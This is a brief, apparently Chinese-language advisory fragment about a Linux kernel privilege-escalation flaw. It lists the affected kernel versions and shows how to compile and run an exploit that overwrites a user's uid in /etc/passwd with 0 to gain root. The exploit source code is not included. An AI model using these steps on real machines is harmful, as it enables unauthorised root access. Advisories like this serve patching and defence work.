```
gcc exploit.c -o exploit -std=c99

# 
./exploit 
Usage: ./exp TARGETFILE OFFSET DATA

# 在 /etc/passwd 文件里找到普通用户的 uid 偏移位置，把 uid 修改为 0 即可，重新登陆就是 root 权限

```

```
影响范围

Linux Kernel版本 >= 5.8

Linux Kernel版本 < 5.16.11 / 5.15.25 / 5.10.102
```
